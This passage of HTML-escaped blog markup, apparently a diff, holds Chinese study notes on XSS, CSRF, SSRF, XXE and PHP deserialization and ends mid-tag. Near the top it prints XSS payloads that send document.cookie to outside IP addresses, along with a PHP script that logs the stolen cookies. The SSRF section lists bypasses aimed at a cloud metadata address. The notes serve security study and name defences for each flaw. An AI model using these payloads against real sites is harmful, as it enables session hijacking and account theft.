+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs javascript&#34;&gt;&amp;lt;script&amp;gt;&lt;span class=&#34;hljs-variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;hljs-title function_&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#39;&amp;lt;img src=&#34;47.100.33.58/getcookie.php?cookie=&#39;&lt;/span&gt;+&lt;span class=&#34;hljs-variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;hljs-property&#34;&gt;cookie&lt;/span&gt;+&lt;span class=&#34;hljs-string&#34;&gt;&#39;&#34;width=0 height=0/&amp;gt;&#39;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;储存型XSS&#34;&gt;&lt;a href=&#34;#储存型XSS&#34; class=&#34;headerlink&#34; title=&#34;储存型XSS&#34;&gt;&lt;/a&gt;储存型XSS&lt;/h2&gt;&lt;hr&gt;
+&lt;p&gt;盗取cookie方法&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#前端代码&lt;/span&gt;&lt;br&gt;&amp;lt;script&amp;gt;window.&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#39;http://10.65.20.196:8080/cookie.asp?msg=&#39;&lt;/span&gt;+document.cookie)&amp;lt;/script&amp;gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 服务端&lt;/span&gt;&lt;br&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&#39;cook&#39;&lt;/span&gt;])){&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$msg&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&#39;cook&#39;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$time&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&#39; | &#39;&lt;/span&gt;.&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getdate&lt;/span&gt;()[&lt;span class=&#34;hljs-string&#34;&gt;&#39;year&#39;&lt;/span&gt;].&lt;span class=&#34;hljs-string&#34;&gt;&#39;/&#39;&lt;/span&gt;.&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getdate&lt;/span&gt;()[&lt;span class=&#34;hljs-string&#34;&gt;&#39;mon&#39;&lt;/span&gt;].&lt;span class=&#34;hljs-string&#34;&gt;&#39;/&#39;&lt;/span&gt;.&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getdate&lt;/span&gt;()[&lt;span class=&#34;hljs-string&#34;&gt;&#39;mday&#39;&lt;/span&gt;].&lt;span class=&#34;hljs-string&#34;&gt;&#39;/&#39;&lt;/span&gt;.&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getdate&lt;/span&gt;()[&lt;span class=&#34;hljs-string&#34;&gt;&#39;hours&#39;&lt;/span&gt;].&lt;span class=&#34;hljs-string&#34;&gt;&#39;/&#39;&lt;/span&gt;.&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getdate&lt;/span&gt;()[&lt;span class=&#34;hljs-string&#34;&gt;&#39;minutes&#39;&lt;/span&gt;].&lt;span class=&#34;hljs-string&#34;&gt;&#39;/&#39;&lt;/span&gt;.&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getdate&lt;/span&gt;()[&lt;span class=&#34;hljs-string&#34;&gt;&#39;seconds&#39;&lt;/span&gt;].&lt;span class=&#34;hljs-string&#34;&gt;&#39; Cookie: &#39;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&#34;REMOTE_ADDR&#34;&lt;/span&gt;].&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;md5&lt;/span&gt;((&lt;span class=&#34;hljs-variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&#34;REMOTE_ADDR&#34;&lt;/span&gt;].&lt;span class=&#34;hljs-string&#34;&gt;&#39;salt&#39;&lt;/span&gt;));&lt;br&gt;    &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&#39;.txt&#39;&lt;/span&gt;,PHP_EOL.&lt;span class=&#34;hljs-variable&#34;&gt;$time&lt;/span&gt;.&lt;span class=&#34;hljs-variable&#34;&gt;$msg&lt;/span&gt;, FILE_APPEND);&lt;br&gt;}&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;{&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$msg&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;br&gt;}&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;DOM型XSS&#34;&gt;&lt;a href=&#34;#DOM型XSS&#34; class=&#34;headerlink&#34; title=&#34;DOM型XSS&#34;&gt;&lt;/a&gt;DOM型XSS&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;DOM即是Document object model&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;DOM型是通过修改或读取document的属性和方法进行攻击，既有反射性也有存储型，而且没有与服务器进行交互&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;DOM型XSS的程序只有HTML代码，并不存在服务器代码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;DOM型XSS的输出是由DOM操作产生的，&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;危害：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;盗取cookie，配合CSRF&lt;/li&gt;
+&lt;li&gt;劫持会话&lt;/li&gt;
+&lt;li&gt;网络钓鱼&lt;/li&gt;
+&lt;li&gt;骚套路打后台告警&lt;/li&gt;
+&lt;li&gt;控制受害主机向其他网站发起攻击&lt;/li&gt;
+&lt;li&gt;传播跨站脚本蠕虫&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;防御方法：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;htmlspecialchars 和 htmlentities函数进行过滤&lt;/li&gt;
+&lt;li&gt;设置Http only机制可以防止cookie被盗取&lt;/li&gt;
+&lt;li&gt;验证Refer字段&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;CSRF原理&#34;&gt;&lt;a href=&#34;#CSRF原理&#34; class=&#34;headerlink&#34; title=&#34;CSRF原理&#34;&gt;&lt;/a&gt;CSRF原理&lt;/h1&gt;&lt;ol&gt;
+&lt;li&gt;跨站请求伪造：原理是利用网站对于用户网页浏览器的信任，挟持用户当前已经登陆的web身份，去执行非用户本意的操作&lt;/li&gt;
+&lt;li&gt;流程：生成跨站请求链接，诱导用户点击链接，劫持用户的cookie&lt;/li&gt;
+&lt;li&gt;可以是GET型也可以是POST型，POST型的表单存存放在黑客网站的页面中，当用户访问黑客的页面时会造成利用用户的浏览器身份向服务器发送请求&lt;/li&gt;
+&lt;li&gt;防御：使用http的refer字段进行验证，添加CSRF token验证,在每次请求时服务器都会给用户不同的token&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;SSRF原理&#34;&gt;&lt;a href=&#34;#SSRF原理&#34; class=&#34;headerlink&#34; title=&#34;SSRF原理&#34;&gt;&lt;/a&gt;SSRF原理&lt;/h1&gt;&lt;ol&gt;
+&lt;li&gt;服务器请求伪造，指的是在攻击者未能取得服务器的权限时以服务器的身份发送一条构造好的请求给服务器所在的内网主机发送消息，外部网络一般无法访问内部网络，要依靠该漏洞作为跳板请求内网主机。主要原因是从其他服务器应用获取数据的功能但是没有对目标地址做过滤和探测。例如分享时会加载一些页面，就是对外部的请求，例如给个链接进行翻译，给定一个资源链接开始下载资源&lt;/li&gt;
+&lt;li&gt;产生SSRF的漏洞的函数：&lt;ol&gt;
+&lt;li&gt;file_get_contents（）支持php://input&lt;/li&gt;
+&lt;li&gt;sockopen()&lt;/li&gt;
+&lt;li&gt;curl_exec()&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;可以使用的协议有哪些：&lt;ol&gt;
+&lt;li&gt;http协议，gopher(gopher协议不能进行URL编码），zip，file协议&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;危害：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;&lt;/p&gt;
+&lt;p&gt;2.攻击运行在内网或本地的应用程序（比如溢出）;&lt;/p&gt;
+&lt;p&gt;3.对内网web应用进行指纹识别，通过访问默认文件实现;&lt;/p&gt;
+&lt;p&gt;4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;&lt;/p&gt;
+&lt;p&gt;5.利用file协议读取本地文件等。.&lt;/p&gt;
+&lt;p&gt;6.各个协议调用探针：http,file,dict,ftp,gopher等&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;防御方法：&lt;ol&gt;
+&lt;li&gt;过滤返回信息，确保用户请求的返回内容符合标准&lt;/li&gt;
+&lt;li&gt;统一的错误信息，避免用户根据错误信息来判断端口的状态&lt;/li&gt;
+&lt;li&gt;使用DNS缓存或者HOST的白名单的方式进行防御&lt;/li&gt;
+&lt;li&gt;限制协议为http或者https.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;绕过方法：&lt;ol&gt;
+&lt;li&gt;短网址&lt;/li&gt;
+&lt;li&gt;将IP地址改为十六进制表示&lt;/li&gt;
+&lt;li&gt;特殊域名可以利用[::]来绕过localhost [&lt;a href=&#34;http://169.254.169.254&gt;&gt;http://[::169.254.169.254](http://169.254.169.254%3E%3Ehttp/%5b::169.254.169.254)]&#34;&gt;http://169.254.169.254&amp;gt;&amp;gt;http://[::169.254.169.254](http://169.254.169.254%3E%3Ehttp/%5b::169.254.169.254)]&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;XXE原理&#34;&gt;&lt;a href=&#34;#XXE原理&#34; class=&#34;headerlink&#34; title=&#34;XXE原理&#34;&gt;&lt;/a&gt;XXE原理&lt;/h1&gt;&lt;ol&gt;
+&lt;li&gt;XXE漏洞即XML外部实体注入，当xml引用外部实体并进行解析时会产生的漏洞，xml解析器会获取其中的外部资源并存储到内部实体中，攻击者可以引用外部资源并存储到内部实体中，攻击者可以引用外部实体对目标进行文件读取，命令执行，DDOS，内网探测等操作&lt;/li&gt;
+&lt;li&gt;解决方法：&lt;ol&gt;
+&lt;li&gt;在php的libxml_disable_entity_loader(true) 不允许加载外部实体&lt;/li&gt;
+&lt;li&gt;过滤用户提交的xml数据，比如entity，system等&lt;/li&gt;
+&lt;li&gt;配置XML处理器禁用DTD，禁止外部实体解析，通过黑名单过滤用户提交的数据&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;反序列化漏洞&#34;&gt;&lt;a href=&#34;#反序列化漏洞&#34; class=&#34;headerlink&#34; title=&#34;反序列化漏洞&#34;&gt;&lt;/a&gt;反序列化漏洞&lt;/h1&gt;&lt;h2 id=&#34;前导知识&#34;&gt;&lt;a href=&#34;#前导知识&#34; class=&#34;headerlink&#34; title=&#34;前导知识&#34;&gt;&lt;/a&gt;前导知识&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 两个重要的函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;serialize&lt;/span&gt;()&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;()&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//第一个是将传入的字符串转换为对象，第二个则是将对象转换为字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//序列化后的字符串&lt;/span&gt;&lt;br&gt;O:&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;DemoClass&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;name&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;john&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;sex&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;Women&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;age&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;18&#34;&lt;/span&gt;;}&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 其中O代表是个对象，后面的数代表对象类别的名字长度，然后是对象名称，最后是对象中的元素数量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//s代表后面的对象元素是字符串，若为数字则是i&lt;/span&gt;&lt;br&gt;O:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;Name&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;\0Name\0username&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;admin&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;\0Name\0password&#34;&lt;/span&gt;;i:&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;;}&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 若为private，则需要在类名和字段名前面都加上\0  (python)  若为URL提交则需要\0替换为%00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//数组,则需要用中括号，其中第一个为i表明数字，标号使用0&lt;/span&gt;&lt;br&gt;s:&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;nickname&#34;&lt;/span&gt;;a:&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;:{i:&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;204&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;whe&#34;&lt;/span&gt;;} &lt;span class=&#34;hljs-comment&#34;&gt;//后面不跟分号&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//其中s代表当前属性的值为str类型格式为s:长度:&#34;字符串内容&#34;，当为int型时，则使用i:数字   &lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433022.png&#34; alt=&#34;image-20200803145952668&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;私有和保护属性&#34;&gt;&lt;a href=&#34;#私有和保护属性&#34; class=&#34;headerlink&#34; title=&#34;私有和保护属性&#34;&gt;&lt;/a&gt;私有和保护属性&lt;/h2&gt;&lt;figure class=&#34;highlight llvm&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs llvm&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt;属性在进行序列化时会在成员名前加上&lt;span class=&#34;hljs-variable&#34;&gt;%00&lt;/span&gt;类名&lt;span class=&#34;hljs-variable&#34;&gt;%00&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433033.png&#34; alt=&#34;image-20200803152828191&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Example是当前类的类名，其中filename是当前的成员名&lt;/p&gt;
+&lt;figure class=&#34;highlight llvm&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs llvm&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt;要在成员名前加上&lt;span class=&#34;hljs-variable&#34;&gt;%00&lt;/span&gt;*&lt;span class=&#34;hljs-variable&#34;&gt;%00&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433029.png&#34; alt=&#34;image-20200803152817741&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;序列化他只序列化属性，不序列化方法&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;魔法函数&#34;&gt;&lt;a href=&#34;#魔法函数&#34; class=&#34;headerlink&#34; title=&#34;魔法函数&#34;&gt;&lt;/a&gt;魔法函数&lt;/h3&gt;&lt;figure class=&#34;highlight scss&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs scss&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//魔法函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__construct&lt;/span&gt;()，类的构造函数，当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__destruct&lt;/span&gt;()，类的析构函数，反序列化时调用	&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__call&lt;/span&gt;()，在对象中调用一个不可访问方法时调用&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__callStatic&lt;/span&gt;()，用静态方式中调用一个不可访问方法时调用&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__get&lt;/span&gt;()，获得一个类的成员变量时调用，当访问一个不存在的属性时也会触发该操作&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__set&lt;/span&gt;()，设置一个类的成员变量时调用&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__isset&lt;/span&gt;()，当对不可访问属性调用&lt;span class=&#34;hljs-built_in&#34;&gt;isset&lt;/span&gt;()或&lt;span class=&#34;hljs-built_in&#34;&gt;empty&lt;/span&gt;()时调用&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__unset&lt;/span&gt;()，当对不可访问属性调用&lt;span class=&#34;hljs-built_in&#34;&gt;unset&lt;/span&gt;()时被调用。&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__sleep&lt;/span&gt;()，执行&lt;span class=&#34;hljs-built_in&#34;&gt;serialize&lt;/span&gt;()时，先会调用这个函数&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__wakeup&lt;/span&gt;()，执行&lt;span class=&#34;hljs-built_in&#34;&gt;unserialize&lt;/span&gt;()时，先会调用这个函数&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__toString&lt;/span&gt;()，类被当成字符串时的回应方法，例如执行字符串匹配的时候回触发&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__invoke&lt;/span&gt;()，调用函数的方式调用一个对象时的回应方法&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__set_state&lt;/span&gt;()，调用&lt;span class=&#34;hljs-built_in&#34;&gt;var_export&lt;/span&gt;()导出类时，此静态方法会被调用。&lt;br&gt;&lt;br&gt;&lt;span 